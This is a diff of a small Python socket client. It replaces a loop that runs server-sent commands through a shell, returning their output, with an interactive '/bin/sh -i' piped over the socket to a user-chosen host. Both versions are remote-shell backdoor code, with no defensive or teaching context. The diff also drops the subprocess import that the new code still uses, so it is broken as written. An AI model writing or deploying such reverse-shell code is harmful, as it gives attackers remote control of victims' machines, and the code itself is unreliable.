@@ -1,57 +1,23 @@
 import socket
-import subprocess
 
-def get_config():
-    host = input('Enter the host address of the server: ')
-    port = int(input('Enter the port of the server: '))
-    return (host, port)
-
-def main():
-    server_address = get_config()
+def start_client():
+    # Ask the user for the address and port to connect to
+    server_address = input('Enter the address to connect to: ')
+    server_port = int(input('Enter the port to connect to: '))
 
     # Create a TCP/IP socket
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # Connect the socket to the server's address and port
-    client.connect(server_address)
+    # Connect the socket to a specific address and port
+    print('Connecting to %s port %s' % (server_address, server_port))
+    client_socket.connect((server_address, server_port))
 
-    # Receive the options from the server
-    options = b''
-    while True:
-        data = client.recv(1024)
-        if not data:
-            break
-        options += data
-
-    print('Received options from the server:')
-    print(options.decode())
-
-    # Choose an option
-    choice = int(input('Enter your choice: '))
-    client.sendall(str(choice).encode())
-
-    # Receive the result from the server
-    result = b''
-    while True:
-        data = client.recv(1024)
-        if not data:
-            break
-        result += data
-
-    print('Received result from the server:')
-    print(result.decode())
-
-    # Receive commands from the server
-    while True:
-        command = client.recv(1024)
-        if not command:
-            break
-        process = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
-        client.sendall(stdout + stderr)
+    # Start a remote shell
+    subprocess.call(['/bin/sh', '-i'], stdin=client_socket, stdout=client_socket, stderr=client_socket)
 
     # Clean up the connection
-    client.close()
+    client_socket.close()
+    print('Connection closed.')
 
 if __name__ == '__main__':
-    main()
+    start_client()
